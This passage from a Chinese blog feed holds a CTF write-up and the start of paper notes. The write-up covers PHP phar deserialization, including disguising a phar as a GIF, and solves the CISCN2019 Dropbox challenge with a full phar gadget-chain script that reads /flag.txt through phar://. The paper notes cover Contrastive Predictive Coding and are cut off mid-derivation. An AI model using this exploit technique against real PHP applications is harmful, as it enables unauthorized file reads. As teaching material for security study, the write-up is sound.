</li>
</ul>
<p><br></p>
<p>（2）除此之外，我们还可以将phar伪造成其他格式的文件。</p>
<p>php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到加了GIF89a文件头，从而使其伪装成gif文件：</p>
<p><img src="/2019/11/13/phar-unserialize/20190918193823420.png" alt="在这里插入图片描述"></p>
<h1 id="0x05-实例分析"><a href="#0x05-实例分析" class="headerlink" title="0x05 实例分析"></a>0x05 实例分析</h1><h5 id="CISCN2019-Dropbox"><a href="#CISCN2019-Dropbox" class="headerlink" title="CISCN2019 Dropbox"></a>CISCN2019 Dropbox</h5><p>进入题目后，注册一个账号并登录，发现是一个网盘界面，限制了只能上传图片后缀，并能进行下载、删除操作：</p>
<p><img src="/2019/11/13/phar-unserialize/20191113111214787.png" alt="在这里插入图片描述"></p>
<p>没有其他什么利用点，我们抓一下下载的包：</p>
<p><img src="/2019/11/13/phar-unserialize/20191113111237768.png" alt="在这里插入图片描述"></p>
<p>发现可以成功读取到文件的内容，于是尝试任意文件下载：</p>
<p><img src="/2019/11/13/phar-unserialize/20191113111359877.png" alt="在这里插入图片描述"></p>
<p>确认存在任意文件下载，<code>upload.php</code>、<code>class.php</code>、<code>download.php</code>、<code>index.php</code>、<code>login.php</code>、<code>register.php</code>均可以下载得到源码，下面就是进行代码审计了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//download.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line">ini_set(<span class="string">"open_basedir"</span>, getcwd() . <span class="string">":/etc:/tmp"</span>);</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, <span class="string">"flag"</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/octet-stream"</span>);</span><br><span class="line">    Header(<span class="string">"Content-Disposition: attachment; filename="</span> . basename($filename));</span><br><span class="line">    <span class="keyword">echo</span> $file-&gt;close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File not exist"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">=</span><br></pre></td></tr></table></figure>
<p>在<code>download.php</code>中我们可以看到它过滤了<code>flag</code>，这反而说明了<code>flag</code>就在当前目录下，但是不允许通过任意文件下载读取。</p>
<p>继续审计，发现在<code>class.php</code>中<code>File</code>类的<code>close</code>方法有敏感函数<code>file_get_contents()</code>，这里应该就是利用点。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$dbaddr = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">$dbuser = <span class="string">"root"</span>;</span><br><span class="line">$dbpass = <span class="string">"root"</span>;</span><br><span class="line">$dbname = <span class="string">"dropbox"</span>;</span><br><span class="line">$db = <span class="keyword">new</span> mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;store_result();</span><br><span class="line">        $count = $stmt-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> ($count === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"ss"</span>, $username, $password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($expect);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($expect) &amp;&amp; $expect === $password) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        $filenames = scandir($path);</span><br><span class="line"></span><br><span class="line">        $key = array_search(<span class="string">"."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line">        $key = array_search(<span class="string">".."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($filenames <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">            $file = <span class="keyword">new</span> File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, $file);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;<span class="comment">//$func = close()</span></span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">            <span class="comment">//$file-&gt;close()   $file = new File;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $table = <span class="string">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;thead&gt;&lt;tr&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;'</span> . htmlentities($func) . <span class="string">'&lt;/th&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;/thead&gt;&lt;tbody&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;tr&gt;'</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">                $table .= <span class="string">'&lt;td class="text-center"&gt;'</span> . htmlentities($value) . <span class="string">'&lt;/td&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= <span class="string">'&lt;td class="text-center" filename="'</span> . htmlentities($filename) . <span class="string">'"&gt;&lt;a href="#" class="download"&gt;下载&lt;/a&gt; / &lt;a href="#" class="delete"&gt;删除&lt;/a&gt;&lt;/td&gt;'</span>;</span><br><span class="line">            $table .= <span class="string">'&lt;/tr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $size = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        $units = <span class="keyword">array</span>(<span class="string">' B'</span>, <span class="string">' KB'</span>, <span class="string">' MB'</span>, <span class="string">' GB'</span>, <span class="string">' TB'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $size &gt;= <span class="number">1024</span> &amp;&amp; $i &lt; <span class="number">4</span>; $i++) $size /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round($size, <span class="number">2</span>).$units[$i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>下面要思考的就是如何才能利用到这个函数，看到这些类以及魔术方法，不难想到应该是使用PHP反序列化来读取文件。</p>
<p>但是发现整个代码里没有使用<code>unserialize()</code>函数，这时就要利用上面的Phar反序列化，我们寻找利用点。</p>
<p>在<code>delete.php</code>中:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"File not exist"</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到创建了一个<code>File</code>类的对象，然后调用了<code>open()</code>方法，参数就是我们要删除的文件名，我们去看一下这个<code>open()</code>方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>使用了<code>file_exists()</code>和<code>is_dir()</code>处理了<code>filename</code>，而前面总结过，这两个函数都可以造成phar反序列化。</p>
<p>这样这题的思路就清楚了，即利用phar反序列化控制<code>file_get_contents</code>来读取<code>flag.txt</code></p>
<p>于是我们来审计<code>class.php</code>构造序列化脚本，首先找一下有哪些魔术方法，看到User类中<code>__destruct()</code>调用了同名的<code>close()</code>方法，而FileList类中有<code>__call()</code>方法。</p>
<p>熟悉反序列化的应该很容易看出来：将User类的<code>$db</code>实例化为FIleLise的对象，这样当析构函数被调用的时候，就会调用FileList类的<code>close()</code>方法，而FileList类并没有该方法，于是调用<code>__call()</code>方法，观察一下<code>__call</code>方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>调用后相当于把<code>close</code>传给了参数<code>$func</code>，然后遍历<code>$files</code>分别调用每个值的<code>$func()</code>方法，这里也就是调用<code>close()</code>，并将结果赋给<code>result</code>。<br>所以只需要<code>$files</code>里有一个File类的对象，就能调用File类中的<code>close()</code>方法了，再将File类的<code>filename</code>赋为<code>/flag.txt</code>即可将结果读出来，然后在FileList类的<code>__destruct()</code>方法中会<code>result</code>的结果打印出来。</p>
<p>最终脚本如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> FileList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">'/flag.txt'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">@unlink(<span class="string">"shell.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"shell.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<p>运行得到<code>shell.phar</code>，改后缀为png上传：</p>
<p><img src="/2019/11/13/phar-unserialize/20191113134929979.png" alt="在这里插入图片描述"></p>
<p>在删除的时候抓包，并加上<code>phar://</code>伪协议，然后发包即可成功读到flag：</p>
<p><img src="/2019/11/13/phar-unserialize/20191113135143952.png" alt="在这里插入图片描述"></p>
<p><br></p>
<p><br></p>
<p>本篇文章以总结为主，所以部分内容参考了下列文章：<br><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a><br><a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/38</a><br><a href="https://xz.aliyun.com/t/6057" target="_blank" rel="noopener">https://xz.aliyun.com/t/6057</a></p>
]]></content>
      <categories>
        <category>System Security</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>【论文笔记——对比预测编码CPC】Representation Learning with Contrastive Predictive Coding</title>
    <url>/2020/10/19/%E3%80%90%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%AF%B9%E6%AF%94%E9%A2%84%E6%B5%8B%E7%BC%96%E7%A0%81CPC%E3%80%91Representation-Learning-with-Contrastive-Predictive-Coding/</url>
    <content><![CDATA[<p>arxiv：<a href="https://arxiv.org/abs/1807.03748" target="_blank" rel="noopener">https://arxiv.org/abs/1807.03748</a></p>
<p>code：<a href="https://github.com/jefflai108/Contrastive-Predictive-Coding-PyTorch" target="_blank" rel="noopener">https://github.com/jefflai108/Contrastive-Predictive-Coding-PyTorch</a></p>
<h2 id="1-Introduce"><a href="#1-Introduce" class="headerlink" title="1 Introduce"></a>1 Introduce</h2><p>作者提出了一种叫做“<strong>对比预测编码（CPC, Contrastive Predictive Coding）</strong>”的无监督方法，可以从高维数据中提取有用的 representation，这种 representation 学习到了对预测未来最有用的信息。</p>
<p>目前无监督学习存在的问题：</p>
<ul>
<li>如何更好的从原始观测值中建模high-level representarion</li>
<li>理想情况下的学习的representation到底是什么样的？是否可以使用无监督学习进行理想的representation learning？</li>
<li>作者将无监督学习与预测编码的思想相结合，提出了是否学习到一些能对未来有很好预测效果的representation？</li>
</ul>
<p>本文的工作如下：</p>
<ul>
<li>将高维数据压缩到更紧凑的隐空间中，在其中条件预测更容易建模。</li>
<li>我们使用强大的自回归模型在这个隐空间中预测未来的许多步骤。</li>
<li>依靠噪声对比估计（Noise-Contrastive Estimation）$^{[12]}$来计算损失函数（和自然语言模型中的学习单词嵌入方式类似），从而可以对整个模型进行端到端的训练。</li>
<li>最终提出的Contrastive Predictive Codeing（CPC）方法可以用相同的机制在图像、语音、自然语言、强化学习等多个模态的数据上都能学习到高级信息。</li>
</ul>
<h2 id="2-Motivation-amp-amp-Intuitions"><a href="#2-Motivation-amp-amp-Intuitions" class="headerlink" title="2 Motivation &amp;&amp; Intuitions"></a>2 Motivation &amp;&amp; Intuitions</h2><p>模型主要的Intuitions就是学习一种能够对高维信号不同部分的基础共享信息（underlying shared infomation）进行编码的representation，同时丢弃掉更底层的低级信息和噪声。在时间序列和高维的建模中，通过对能够进行预测的representation进行学习，会使其学习到更多的全局结构，作者将学习到的这种特征称为”slow features“。$^{[13]}$</p>
<p>预测高维数据的难点之一是均方误差和交叉熵这样的单峰损失效果不好，而如果使用一个强大的条件生成模型对每个细节进行重建，就会需要很大的计算量，并且会忽略了数据集$x$中的上下文关系$c$。（如一张图片包含上千位的信息，而最后的高级隐变量有可能仅仅是1024类别里10bit的一个类标签）。</p>
<p>因此如果是为了提取出$x$和$c$之间的共享信息（shared information），直接建模生成模型 $p(x|c)$ 并不是最佳的。</p>
<p>作者提出最大化 $x$（预测的未来）和上下文 $c$ （现在的环境）之间互信息的方式，定义如下：<br>$$<br>I(x ; c)=\sum_{x, c} p(x, c) \log \frac{p(x \mid c)}{p(x)} \tag{1}<br>$$<br>这里进一步解释一些<strong>互信息（mutual infomation）</strong>，互信息实际上就是表示<strong>两个变量之间的相关性</strong>，上式也就是互信息的定义式的变形，$I(x;c)$表示 $x$ 与 $c$ 的关系，但具体是什么关系呢？可以看如下的推导：<br>
$$
\begin{aligned}
I(x;c) &=\sum_{x, c} p(x, c) \log \frac{p(x \mid c)}{p(x)} \\
&=\sum_{x, c} p(x, c) \log p(x \mid c)-\sum_{x, c} p(x, c) \log p(x) \\
&=\sum_{c} p(c) \sum_{x} p(x \mid c) \log p(x \mid c)-\sum_{x} \sum_{c} p(x, c) \log p(x) \\
&=-H(x \mid c)+H(x) \\
&=H(x)-H(x \mid c)
\end{aligned}
$$
<br>最终的结果是 $H(x)-H(x|c)$，其中$H(x)$为$x$的熵，用来衡量$x$的不确定度，定义如下：<br>$$<br>H(x)=-\sum_x p(x)logp(x)<br>$$<br>而$I(x,c)=H(x)-H(x|c)$也就说明了$x$与$c$的互信息<strong>即表示由于 $c$ 的引入而使 $x$ 熵减小的量，也就是 $x$ 不确定度减小的量</strong>。</p>
<p>因此，放在论文中的含义来看，最大化$I(x;c)$也就是通过充分学习现在的上下文 $c$ 最大程度的减小了未来 $x$ 的不确定度，从而起到了预测的效果，所以所以CPC希望网络可以最大化 $x$ 和 $c$ 之间的互信息。</p>
<h2 id="3-Method"><a href="#3-Method" class="headerlink" title="3 Method"></a>3 Method</h2><h3 id="3-1-Contrastive-Predicting-Coding"><a href="#3-1-Contrastive-Predicting-Coding" class="headerlink" title="3.1 Contrastive Predicting Coding"></a>3.1 Contrastive Predicting Coding</h3><p><img src="/2020/10/19/【论文笔记——对比预测编码CPC】Representation-Learning-with-Contrastive-Predictive-Coding/image-20201015213150794.png" alt="image-20201015213150794"></p>
<p>上图就是 CPC 的架构图（以语音信号为例），首先用非线性编码器 $g_{enc}$（如AutoEncoder或者CNN） 将分割的时间窗口上的每个观测值 $x_t$的进行 $z_t=g_{enc}(x_t)$ 映射，得到到representation vector，然后再将$z_t$以及潜空间中之前所有时刻的相关信息输入到一个自回归模型 $g_{ar}$中，生成当前时刻的上下文表示$c_t=g_{ar}(z_{≤t})$</p>


如果要用当前的 $c$ 去预测 $k$ 个时刻后的 $z_{t+k}$ ，之前提到作者不采用生成模型 $p(x_{t+k}|c)$ 进行预测，而是最大化 $x_{t+k}$和 $c$ 之间的互信息使得预测的 $\hat{z}_{t+i}$ 与真实的  $z_{t+i}$  尽可能的相似。 根据等式1，我们没办法控制互信息中的 $x$ 和 $c$ 的联合分布概率 $p(x,c)$，因此作者提出了一个密度比的概念，如下：


<p>$$<br>f_{k}\left(x_{t+k}, c_{t}\right) \propto \frac{p\left(x_{t+k} \mid c_{t}\right)}{p\left(x_{t+k}\right)} \tag {2}<br>$$</p>

